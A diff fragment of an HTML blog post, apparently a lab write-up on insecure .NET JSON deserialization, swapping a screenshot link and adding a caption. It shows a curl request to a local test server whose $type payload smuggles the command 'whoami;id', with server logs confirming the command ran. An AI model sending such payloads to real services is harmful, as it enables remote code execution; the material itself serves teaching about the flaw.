@@ -235,7 +235,8 @@
 <p>Example request using curl:</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:5000/Deserialize -d <span class="hljs-string">&#x27;&#123;&quot;$type&quot;: &quot;User, VulnDeserApp&quot;, &quot;Command&quot;: &quot;whoami;id&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F8717181c-3298-456a-ab38-4cda8a4986de%2F157baa02-5450-42ee-98dc-3282fd2ecda7%2FScreenshot_From_2026-03-16_06-19-28.png/size/w=2000?exp=1773646375&sig=gPJzKZZfqHDGryW71S5bZsDDksKRtbFCiaKGh2f5s4g&id=325cfe93-cd0e-807d-922c-eb9e5e5b305b&table=block&userId=57f6b88f-ef50-43ed-abb8-00731e19a837" alt="Alt"></p>
+<p>This screenshoot shows the result we got after sending our payload to dotnet server:</p>
+<p><img src="https://i.ibb.co/4whCgnN1/Untitled-design.jpg" alt="img"></p>
 <p>When the payload is processed, the server logs show the following output:</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">request_body: &#123;<span class="hljs-string">&quot;<span class="hljs-variable">$type</span>&quot;</span>: <span class="hljs-string">&quot;User, VulnDeserApp&quot;</span>, <span class="hljs-string">&quot;Command&quot;</span>: <span class="hljs-string">&quot;whoami;id&quot;</span>&#125;<br><br>[*]<span class="hljs-built_in"> User </span>Constructor executed!<br>[*] Command: Setter executed with: whoami;id<br><br>toowan<br><span class="hljs-attribute">uid</span>=1000(toowan) <span class="hljs-attribute">gid</span>=1000(toowan)<br><span class="hljs-attribute">groups</span>=1000(toowan),4(adm),27(sudo),129(docker)<br></code></pre></td></tr></table></figure>
 
